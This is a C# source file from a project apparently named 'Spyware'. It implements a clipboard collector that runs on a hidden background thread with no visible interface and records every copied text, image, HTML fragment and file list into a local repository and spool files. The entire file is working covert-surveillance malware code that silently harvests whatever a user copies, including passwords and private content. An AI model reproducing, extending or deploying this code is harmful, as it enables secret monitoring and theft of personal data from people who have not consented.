using System.Windows.Forms;
using Spyware.Core.Configuration;
using Spyware.Core.Contracts;
using Spyware.Core.Logging;
using Spyware.Core.Paths;
using Spyware.Core.Security;
using Spyware.Storage;

namespace Spyware.Collectors.Clipboard;

/// <summary>Hilo STA + bomba de mensajes; el agente no muestra interfaz visible.</summary>
public sealed class ClipboardMonitor : ICollector
{
    private readonly AgentPaths _paths;
    private readonly LocalEventRepository _repository;
    private readonly SpoolManager _spool;
    private readonly ClipboardSection _config;
    private readonly ILog _log;
    private readonly Dictionary<string, string> _lastHashByFormat = new(StringComparer.OrdinalIgnoreCase);
    private readonly object _gate = new();
    private Thread? _thread;
    private ApplicationContext? _context;
    private readonly ManualResetEventSlim _started = new(false);

    public string Name => "clipboard";

    public int CapturedCount { get; private set; }
    public int DuplicateCount { get; private set; }

    public ClipboardMonitor(AgentPaths paths, LocalEventRepository repository, SpoolManager spool,
                            ClipboardSection config, ILog log)
    {
        _paths = paths;
        _repository = repository;
        _spool = spool;
        _config = config;
        _log = log;
    }

    public void Start()
    {
        if (!_config.Enabled)
        {
            _log.Info("Collector de portapapeles deshabilitado.");
            return;
        }

        _thread = new Thread(RunStaThread)
        {
            IsBackground = true,
            Name = "Spyware.ClipboardListener"
        };

        _thread.SetApartmentState(ApartmentState.STA);
        _thread.Start();

        if (!_started.Wait(TimeSpan.FromSeconds(5)))
            _log.Warn("El listener de portapapeles no confirmó arranque en 5 s.");
    }

    public void Stop()
    {
        ApplicationContext? context = _context;
        try { context?.ExitThread(); }
        catch (Exception ex) { _log.Debug("ExitThread falló: " + ex.Message); }

        _thread?.Join(TimeSpan.FromSeconds(3));
        _thread = null;
        _context = null;
        _started.Reset();
    }

    private void RunStaThread()
    {
        try
        {
            var window = new ClipboardMessageWindow(_config, OnSnapshot, _log);
            _context = new ApplicationContext(window);
            _started.Set();
            Application.Run(_context);
        }
        catch (Exception ex)
        {
            _started.Set();
            _log.Error("El hilo del portapapeles terminó por un fallo.", ex);
        }
    }

    private void OnSnapshot(ClipboardSnapshot snapshot)
    {
        if (!snapshot.HasContent) return;

        try
        {
            DateTime now = DateTime.UtcNow;
            if (!string.IsNullOrEmpty(snapshot.Text)) StoreText(snapshot.Text, now);
            if (snapshot.ImagePng is { Length: > 0 }) StoreImage(snapshot.ImagePng, now);
            if (!string.IsNullOrEmpty(snapshot.Html)) StoreHtml(snapshot.Html, now);
            if (snapshot.Files is { Count: > 0 }) StoreFiles(snapshot.Files, now);
        }
        catch (Exception ex)
        {
            _log.Error("No se pudo almacenar el evento de portapapeles.", ex);
        }
    }

    private void StoreText(string text, DateTime timestamp)
    {
        int max = Math.Max(64, _config.MaxTextLength);
        bool truncated = text.Length > max;
        if (truncated)
            text = text[..max] + "\n…[truncado]";

        string hash = HashHelper.Sha256Hex(text);
        if (ShouldSkip("text", hash)) return;

        string? path = _config.SaveTextCopy ? _spool.SaveClipboardText(text, timestamp) : null;

        long id = _repository.InsertClipboard(new ClipboardEvent
        {
            TimestampUtc = timestamp,
            Format = "text",
            Content = text,
            FilePath = path,
            Length = text.Length,
            Hash = hash
        });

        Touch(id);
        _log.Info($"Portapapeles texto: {text.Length} car. ({hash[..12]}…) truncado={truncated}.");
    }

    private void StoreImage(byte[] png, DateTime timestamp)
    {
        string hash = HashHelper.Sha256Hex(png);
        if (ShouldSkip("image", hash)) return;

        string path = _spool.SaveClipboardImage(png, timestamp);

        long id = _repository.InsertClipboard(new ClipboardEvent
        {
            TimestampUtc = timestamp,
            Format = "image",
            Content = null,
            FilePath = path,
            Length = png.Length,
            Hash = hash
        });

        Touch(id);
        _log.Info($"Portapapeles imagen: {png.Length / 1024} KB -> {System.IO.Path.GetFileName(path)}");
    }

    private void StoreHtml(string html, DateTime timestamp)
    {
        string hash = HashHelper.Sha256Hex(html);
        if (ShouldSkip("html", hash)) return;

        long id = _repository.InsertClipboard(new ClipboardEvent
        {
            TimestampUtc = timestamp,
            Format = "html",
            Content = html,
            Length = html.Length,
            Hash = hash
        });

        Touch(id);
    }

    private void StoreFiles(IReadOnlyList<string> files, DateTime timestamp)
    {
        string joined = string.Join(Environment.NewLine, files);
        string hash = HashHelper.Sha256Hex(joined);
        if (ShouldSkip("files", hash)) return;

        long id = _repository.InsertClipboard(new ClipboardEvent
        {
            TimestampUtc = timestamp,
            Format = "files",
            Content = joined,
            Length = joined.Length,
            Hash = hash
        });

        Touch(id);
        _log.Info($"Portapapeles archivos: {files.Count} elementos.");
    }

    private bool ShouldSkip(string format, string hash)
    {
        if (!_config.SkipDuplicates) return false;

        lock (_gate)
        {
            if (_lastHashByFormat.TryGetValue(format, out string? previous) && previous == hash)
            {
                DuplicateCount++;
                return true;
            }

            _lastHashByFormat[format] = hash;
            return false;
        }
    }

    private void Touch(long id)
    {
        CapturedCount++;
        _repository.SetMeta("clipboard_last_id", id.ToString());
    }
}
